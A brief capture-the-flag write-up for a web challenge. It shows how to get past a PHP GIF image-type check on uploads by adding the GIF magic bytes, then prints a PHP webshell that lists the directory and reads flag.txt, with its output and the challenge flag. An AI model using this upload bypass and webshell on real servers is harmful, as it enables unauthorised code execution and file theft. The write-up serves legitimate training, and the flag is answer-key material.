---
layout: default
title: level08
---

Another `RCE` using webshell we uploading. This time, we pass this check: 
```php
if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) 
```
By just providing the magic `IMAGETYPE_GIF` which is `GIF`. 

Our webshell will show us the files in the folders, and then we'll read the flag.

```php
<?php 
    $dir = getcwd();  // Current working directory

    $files = scandir($dir);  // Get all files in the current directory
    echo "Files in directory: <br>";
    foreach ($files as $file) {
        echo $file . "<br>";
    }

    echo "Content of flag.txt is:\n".'<br>';
    echo file_get_contents('flag.txt')."<br>";
?>
```
```html
GIF Files in directory: 
<br>.
<br>..
<br>flag.txt
<br>index.php
<br>php-fpm.sock
<br>source.php
<br>uploads
<br>Content of flag.txt is:
<br>
WEBSEC{BypassingImageChecksToRCE}
<br>
```

You can easily upload this GIF (of course this isn't a valid GIF file...), [Fake Gif](./images/level08.gif)


**Flag:** ***`WEBSEC{BypassingImageChecksToRCE}`*** 
